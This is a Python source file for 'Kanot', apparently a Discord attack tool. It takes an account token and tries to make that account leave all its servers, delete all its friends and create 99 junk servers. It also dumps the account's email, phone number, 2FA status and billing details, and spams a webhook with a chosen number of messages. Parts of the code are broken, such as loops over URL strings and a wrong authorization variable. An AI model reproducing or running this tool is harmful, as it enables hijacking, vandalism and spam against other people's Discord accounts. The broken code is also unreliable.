import requests
import os
import json
import uuid
import time
from time import sleep
import datetime
from Discord.RichPresence import *
from datetime import datetime
from colorama import Fore, init

logs = None
kanot_version = '1.0'

with open('Utils/url.json') as f:
    req = json.load(f)

user = uuid.getnode()
        
languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

if req['base']['url'] == '':
    url = 'https://raw.githubusercontent.com/lbeete/Kanot/main/GetVersion.json'
else:
    url = req['base']['url']

    r = requests.get(url=url).json()

    app_name = r['__application_name__']
    app_version = r['__version__']

    if kanot_version == app_version:
        c = f' {Fore.LIGHTCYAN_EX}Version: {Fore.WHITE}{Fore.WHITE}{kanot_version} {Fore.LIGHTCYAN_EX}[{Fore.WHITE}Updated{Fore.LIGHTCYAN_EX}]{Fore.RESET}'
    else:
        c = f' {Fore.LIGHTCYAN_EX}Version: {Fore.WHITE}{kanot_version} {Fore.LIGHTCYAN_EX}[update needed]{Fore.RESET}'

with open('Kanot/RPC.json') as f:
    t = json.load(f)
        
if t['RichPresence']['true/false'] == 'true':
    rpc_notify = f'{Fore.LIGHTCYAN_EX}Discord RPC: {Fore.GREEN}On'
elif t['RichPresence']['true/false'] == 'false':
    rpc_notify = f'{Fore.LIGHTCYAN_EX}Discord RPC: {Fore.RED}Off'
else:
    pass

text = f'''
{Fore.LIGHTCYAN_EX} __  __     ______     __   __     ______     ______  
{Fore.LIGHTCYAN_EX}/\ \/ /    /\  __ \   /\ "-.\ \   /\  __ \   /\__  _\{Fore.LIGHTCYAN_EX}         ┏━━━━━━━━━━━━━━━━━━ [{Fore.WHITE}Info{Fore.LIGHTCYAN_EX}] ━━━━━━━━━━━━━━━━┓
{Fore.LIGHTCYAN_EX}\ \  _"-.  \ \  __ \  \ \ \-.  \  \ \ \/\ \  \/_/\ \/            
{Fore.CYAN} \ \_\ \_\  \ \_\ \_\  \ \_\\" \_\  \ \_____\    \ \_\                   {c}
{Fore.CYAN}  \/_/\/_/   \/_/\/_/   \/_/ \/_/   \/_____/     \/_/ {Fore.RESET}                   {rpc_notify}
{Fore.RESET}                 {Fore.LIGHTCYAN_EX}Thanks for using {Fore.WHITE}Kanot!
{Fore.LIGHTCYAN_EX}                                                              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
{Fore.RESET}'''

session = requests.session()
init()

def cls():
    os.system('cls')

class Endpoints():
    discord_friends = 'https://discord.com/api/v9/users/@me/relationships'
    discord_servers = 'https://discord.com/api/v9/users/@me/guilds'

    friends_id = []
    servers_id = []

class settings():
    def loader():
        try:
            with open('User/Settings.json') as f:
                config = json.load(f)
        except:

            print(text)
            print('\n ({}x{}) - Configure your {}Kanot {}settings!'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.RESET))
            print()
            __logs_question__ = print(' ({}x{}) - Do you want to activate the logs? {}y/n{}'.format(Fore.LIGHTCYAN_EX, Fore.RESET,Fore.LIGHTCYAN_EX, Fore.RESET))
            __logs_input__ = print(' ({}x{}) - Input: '.format(Fore.LIGHTCYAN_EX, Fore.RESET), end='')
            __logs_settings__ = input()

            if (__logs_settings__ == 'y'):
                __logs_settings__ = 'true'

                create_folder = os.mkdir('User')

                __new_settings__ = {
                    "logs": __logs_settings__,
                    "RPC": "true"
                }
                __version__ = {
                    "version": kanot_version
                }
                __hwid__ = {
                    "hwid": user
                }
                with open('User/Settings.json', 'w') as f:
                    json.dump(__new_settings__, f)
                with open('User/version.json', 'w') as f:
                    json.dump(__version__, f)
                with open('User/hwid.json', 'w') as f:
                    json.dump(__hwid__, f)
                with open('User/Settings.json') as f:
                    config = json.load(f)

            elif (__logs_settings__ == 'n'):
                __logs_settings__ = 'false'
                
                create_folder = os.mkdir('User')

                __new_settings__ = {
                    "logs": __logs_settings__,
                    "RPC": "true"
                }
                __version__ = {
                    "version": kanot_version
                }
                __hwid__ = {
                    "hwid": user
                }
                with open('User/Settings.json', 'w') as f:
                    json.dump(__new_settings__, f)
                with open('User/version.json', 'w') as f:
                    json.dump(__version__, f)
                with open('User/hwid.json', 'w') as f:
                    json.dump(__hwid__, f)
                with open('User/Settings.json') as f:
                    config = json.load(f)
                    
            else:
                print(' ({}x{}) - Invalid Settings!'.format(Fore.LIGHTCYAN_EX, Fore.RESET,Fore.LIGHTCYAN_EX, Fore.RESET))
                sleep(3)
                cls()
                settings.loader()

class initial():
    def __init__():
        session = session
        logs = {}
        settings = settings
    
    def time():
        while True:
           return time.strftime('%I:%M:%S')

    def Info(token):
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            res_json = res.json()

            if res.status_code == 200:
                try:
                    if t['RichPresence']['true/false'] == 'true':
                        RichPresence.Rich.update(
                            state='View information',
                            details=f'Account: {res_json["username"]}#{res_json["discriminator"]}',
                            large_image=RPC.large_image,
                            start=time.time(),
                            large_text = RPC.large_text
                        )
                    elif t['RichPresence']['true/false'] == 'false':
                        pass
                except:
                    pass

                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                avatar_id = res_json['avatar']
                avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
                phone_number = res_json['phone']
                email = res_json['email']
                mfa_enabled = res_json['mfa_enabled']
                flags = res_json['flags']
                locale = res_json['locale']
                verified = res_json['verified']
                
                language = languages.get(locale)

                creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

                has_nitro = False
                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d2 - d1).days)

                print('''
{} __  __     ______     __   __     ______     ______  
/\ \/ /    /\  __ \   /\ "-.\ \   /\  __ \   /\__  _\ 
\ \  _"-.  \ \  __ \  \ \ \-.  \  \ \ \/\ \  \/_/\ \/ 
{} \ \_\ \_\  \ \_\ \_\  \ \_\\" \_\  \ \_____\    \ \_\ 
  \/_/\/_/   \/_/\/_/   \/_/ \/_/   \/_____/     \/_/ {}
  
  '''.format(Fore.LIGHTCYAN_EX, Fore.CYAN, Fore.RESET))

                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Username: {Fore.WHITE}{user_name} {Fore.WHITE}| {Fore.LIGHTCYAN_EX}ID: {Fore.WHITE}{user_id} {Fore.WHITE}| {Fore.LIGHTCYAN_EX}Creation date: {Fore.WHITE}{creation_date}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Avatar URL: {Fore.WHITE}{avatar_url if avatar_id else "None"}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Token Account: {Fore.WHITE}{token}')
                print(f'{Fore.RESET}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Nitro:{Fore.WHITE} {has_nitro}')
                if has_nitro:
                    print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Expires in:{Fore.WHITE} {days_left} {Fore.LIGHTCYAN_EX}day(s){Fore.WHITE}')
                print(f'{Fore.RESET}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Phone Number: {Fore.WHITE}{phone_number if phone_number else ""}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Email: {Fore.WHITE}{email if email else "None"}')
                print(f'{Fore.RESET}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}2FA/MFA Enabled: {Fore.WHITE}{mfa_enabled}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Flags: {Fore.WHITE}{flags}')
                print(f'{Fore.RESET}')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Locale: {Fore.WHITE}{locale} ({language})')
                print(f'{Fore.WHITE}| {Fore.LIGHTCYAN_EX}Email Verified: {Fore.WHITE}{verified}')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
            elif res.status_code == 401:
                print(f'[{Fore.RED}x{Fore.WHITE}] {Fore.RESET}Invalid token')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
        except:
            pass

    def main():
        with open('User/Settings.json') as f:
            config = json.load(f)

        os.system('cls' if os.name == 'nt' else 'clear')

        if config.get('logs') == 'true':
            logs = True
            logs_symbol = '+'
        elif config.get('logs') == 'false':
            logs = False
            logs_symbol = '-'
        else:
            return
        
        try:
            if t['RichPresence']['true/false'] == 'true':
                RichPresence.Rich.update(
                    state='In main menu.', 
                    large_image=RPC.large_image,
                    start=time.time(),
                    large_text = RPC.large_text
                )
            elif t['RichPresence']['true/false'] == 'false':
                pass
        except:
            pass

        print(text)
        print(' ({}!{}) - {}Remember:{} the creator of this tool is not responsible for damage caused or misuse!{}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET))
        print(f'''
 {Fore.WHITE}({Fore.LIGHTCYAN_EX}1{Fore.WHITE}) - {Fore.LIGHTCYAN_EX}Discord Token Fucker
 {Fore.WHITE}({Fore.LIGHTCYAN_EX}2{Fore.WHITE}) - {Fore.LIGHTCYAN_EX}Discord Token Info
 {Fore.WHITE}({Fore.LIGHTCYAN_EX}3{Fore.WHITE}) - {Fore.LIGHTCYAN_EX}Webhook Spam
        ''' + Fore.RESET)

        print(' ({}x{}) - Input: '.format(Fore.LIGHTCYAN_EX, Fore.RESET), end='')
        choice = input()

        if (choice == '1'):
            print(' ({}!{}) - Token:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            token = input()
            print(' ({}!{}) - Servers name:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            names = input()
            cls()
            print(text)
            try:
                if t['RichPresence']['true/false'] == 'true':
                    RichPresence.Rich.update(
                        state='Zzz',
                        large_image=RPC.large_image,
                        start=time.time(),
                        large_text = RPC.large_text
                    )
                elif t['RichPresence']['true/false'] == 'false':
                    pass
            except:
                pass

            for guilds in Endpoints.discord_servers:
                try:
                    Endpoints.servers_id.append(guilds['id'])
                except:
                    pass
                
            for id in Endpoints.servers_id:
                try:
                    requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers={'Authorization': token})
                except:
                    pass

            for friends in Endpoints.discord_friends:
                try:
                    Endpoints.friends_id.append(friends['id'])
                except:
                    pass
            
            for id in Endpoints.friends_id:
                try:
                    requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={'Authorization': token})
                    re = requests.get(f'https://discord.com/api/v9/users/{id}', headers={'Authorization': r}).json()
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Friend deleted: {Fore.LIGHTCYAN_EX}{re["username"]}#{re["discriminator"]} {Fore.WHITE}-{Fore.LIGHTCYAN_EX} {r["id"]} {Fore.RESET}')
                except:
                    pass

            for i in range(99):
                try:
                    requests.post('https://discord.com/api/v9/guilds', headers={'Authorization': token}, json={'name': names, 'region': 'europe'})
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Server created - Name: {Fore.LIGHTCYAN_EX}{names}{Fore.RESET}')
                except:
                    pass
            print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
            os.system('pause>nul')
            initial.main()
        elif (choice == '2'):
            print(' ({}!{}) - Token:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            token = input()
            try:
                if t['RichPresence']['true/false'] == 'true':
                    RichPresence.Rich.update(
                        state='Choice: 2',
                        large_image=RPC.large_image,
                        start=time.time(),
                        large_text = RPC.large_text
                    )
                elif t['RichPresence']['true/false'] == 'false':
                    pass
            except:
                pass
            cls()
            initial.Info(token=token)
        elif (choice == '3'):
            try:
                if t['RichPresence']['true/false'] == 'true':
                    RichPresence.Rich.update(
                        state='Choice: 3',
                        large_image=RPC.large_image,
                        start=time.time(),
                        large_text = RPC.large_text
                    )
                elif t['RichPresence']['true/false'] == 'false':
                    pass
            except:
                pass
            cls()
            print(text)
            print(f' ({Fore.LIGHTCYAN_EX}{logs_symbol}{Fore.WHITE}) - Logs: {Fore.LIGHTCYAN_EX}{logs}{Fore.RESET}\n')
            print(' ({}!{}) - Webhook URL:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            web = input()
            print(' ({}!{}) - Webhook Name:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            name = input()
            print(' ({}!{}) - Amount:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            amount = input()
            print(' ({}!{}) - Embed Mode? y/n:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
            embed = input()
            url = web

            n = requests.get(url=url).json()
            webhook_name = n['name']

            if embed == 'y':
                cls()
                print(text)
                print(' ({}!{}) - Embed Message:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
                message = input()
                print(' ({}!{}) - Embed Title:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
                embed_title = input()
                print(f' ({Fore.LIGHTCYAN_EX}!{Fore.WHITE}) - Would you like to save the current settings for embed messages? y/n: ', end='')
                saved = input()
                if saved == 'y':
                    embed_settings = {
                        "embed":{
                            "webhook_name": name,
                            "message_amount": amount,

                            "embed_message": message,
                            "embed_title": embed_title
                        }
                    }
                    with open('Kanot/KanotEmbedSettings.json', 'w') as f:
                        json.dump(embed_settings, f, indent=4)
                elif saved == 'yes':
                    embed_settings = {
                        "embed":{
                            "webhook_name": name,
                            "message_amount": amount,

                            "embed_message": message,
                            "embed_title": embed_title
                        }
                    }
                    with open('Kanot/KanotEmbedSettings.json', 'w') as f:
                        json.dump(embed_settings, f, indent=4)
                elif saved == 'n':
                    pass
                elif saved == 'no':
                    pass
                else:
                    pass
                print()
                # try:
                    #if t['RichPresence']['true/false'] == 'true':
                        #RichPresence.Rich.update(state='Webhook {} | Message: {}'.format(), large_image=RPC.large_image, start=time.time())
                    #elif t['RichPresence']['true/false'] == 'false':
                        #pass
                #except:
                    #pass
                counter = 0
                content = {
                    "content": message
                }
                for x in range(int(amount)):
                    counter += 1
                    try:
                        if t['RichPresence']['true/false'] == 'true':
                            RichPresence.Rich.update(
                                state = 'Webhook Name: {}'.format(webhook_name), 
                                details = 'Sent messages: {}/{}'.format(counter, amount),
                                large_image = RPC.large_image,
                                large_text = RPC.large_text
                            )
                        elif t['RichPresence']['true/false'] == 'false':
                            pass
                    except:
                        pass
                    content = {
                        "username" : name
                    }
                    content["embeds"] = [{
                        "description" : message,
                        "title" : embed_title
                        }
                    ]
                    requests.post(url=url, json=content)
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Message send - {Fore.LIGHTCYAN_EX}Content: {Fore.WHITE}{message} - {Fore.LIGHTCYAN_EX}Webhook name: {Fore.WHITE}{webhook_name}')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
                if saved == 'y':
                    embed_settings = {
                        "embed":{
                            "webhook_name": name,
                            "message_amount": amount,

                            "embed_message": message,
                            "embed_title": embed_title
                        }
                    }
                    with open('Kanot/KanotEmbedSettings.json', 'w') as f:
                        json.dump(embed_settings, f, indent=4)
                elif saved == 'y':
                    embed_settings = {
                        "embed":{
                            "webhook_name": name,
                            "message_amount": amount,

                            "embed_message": message,
                            "embed_title": embed_title
                        }
                    }
                    with open('Kanot/KanotEmbedSettings.json', 'w') as f:
                        json.dump(embed_settings, f, indent=4)
                elif saved == 'n':
                    pass
                elif saved == 'no':
                    pass
                else:
                    pass
                print()
                content = {
                    "content": message
                }
                for x in range(int(amount)):
                    content = {
                        "username" : name
                    }
                    content["embeds"] = [{
                        "description" : message,
                        "title" : embed_title
                        }
                    ]
                    requests.post(url=url, json=content)
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Message send - {Fore.LIGHTCYAN_EX}Content: {Fore.WHITE}{message} - {Fore.LIGHTCYAN_EX}Webhook name: {Fore.WHITE}{webhook_name}')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
            elif embed == 'n':
                print(' ({}!{}) - Message:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
                message = input()
                cls()
                print(text)
                content = {
                    "content": message
                }
                counter = 0
                for x in range(int(amount)):
                    counter += 1
                    try:
                        if t['RichPresence']['true/false'] == 'true':
                            RichPresence.Rich.update(
                                state = 'Webhook Name: {}'.format(webhook_name), 
                                details = 'Sent messages: {}/{}'.format(counter, amount),
                                large_image = RPC.large_image,
                                large_text = RPC.large_text
                            )
                        elif t['RichPresence']['true/false'] == 'false':
                            pass
                    except:
                        pass
                    content = {
                        "content": message
                    }
                    requests.post(url=url, json=content)
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Message send - {Fore.LIGHTCYAN_EX}Content: {Fore.WHITE}{message} - {Fore.LIGHTCYAN_EX}Webhook name: {Fore.WHITE}{webhook_name}')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
            elif embed == 'no':
                print(' ({}!{}) - Message:{} {}'.format(Fore.LIGHTCYAN_EX, Fore.RESET, Fore.LIGHTCYAN_EX, Fore.WHITE, Fore.RESET), end='')
                message = input()
                cls()
                print(text)
                content = {
                    "content": message
                }
                counter = 0
                for x in range(int(amount)):
                    counter += 1
                    try:
                        if t['RichPresence']['true/false'] == 'true':
                            RichPresence.Rich.update(
                                state = 'Webhook Name: {}'.format(webhook_name), 
                                details = 'Sent messages: {}/{}'.format(counter, amount),
                                large_image = RPC.large_image,
                                large_text = RPC.large_text
                            )
                        elif t['RichPresence']['true/false'] == 'false':
                            pass
                    except:
                        pass
                    content = {
                        "content": message
                    }
                    requests.post(url=url, json=content)
                    print(f'{Fore.RESET}{initial.time()}{Fore.LIGHTCYAN_EX} |{Fore.WHITE} Message send - {Fore.LIGHTCYAN_EX}Content: {Fore.WHITE}{message} - {Fore.LIGHTCYAN_EX}Webhook name: {Fore.WHITE}{webhook_name}')
                print(f'\n[{Fore.LIGHTCYAN_EX}x{Fore.WHITE}] Press ENTER to return menu')
                os.system('pause>nul')
                initial.main()
        else:
            initial.main()

        
if __name__ == '__main__':
    settings.loader()
    cls()
    initial.main()